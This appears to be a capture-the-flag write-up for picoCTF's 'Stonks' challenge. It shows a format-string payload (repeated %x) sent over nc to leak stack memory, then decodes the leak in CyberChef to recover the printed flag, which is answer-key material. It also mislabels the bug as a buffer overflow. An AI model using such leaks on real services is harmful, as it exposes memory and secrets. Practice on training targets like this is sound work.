
# Stonks

- `#Binary-Exploitation`
- I decided to try something no one else has before, I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's not secure
- file: `https://mercury.picoctf.net/static/7e71fc0d8cc3339bfad6bf408f7dc510/vuln.c`
- `nc mercury.picoctf.net 6989`
- hint: if you find my API key
- run `nc mercury.picoctf.net 6989` and get prompted to buy or view stonks
- enter 1, then lots of 'a' (hold down the A key) hit enter, see that we get random stonks and program exits
- look at the `vuln.c` file , looks like this vulnerability is a buffer overflow, enter `%p` as input after 1 in prompt. We get printed out `0x9426390` along with purchases of stonks. 
- rerun the program: 1, enter `%x` , copy and paste `%x` a bunch of times `%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x`, hit enter. program prints out `9d56470804b00080489c3f7ee8d80ffffffff19d54160f7ef6110f7ee8dc709d5518019d564509d564706f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3538613032356533ffae007df7f23af8f7ef6440df3af30010f7d85ce9`
- go to cyber chef -- https://gchq.github.io/CyberChef/
- paste, select / drag 'From Hex' and see flag but text needs to be cleaned up, look at ASCII table to se where flag starts, 0x7B = `{` and 0x7D =  `}` and then enter in search box 'Swap endianness' so it is above the 'From Hex' and see the flag in ASCII
- `picoCTF{I_l05t_4ll_my_m0n3y_0a853e52}` 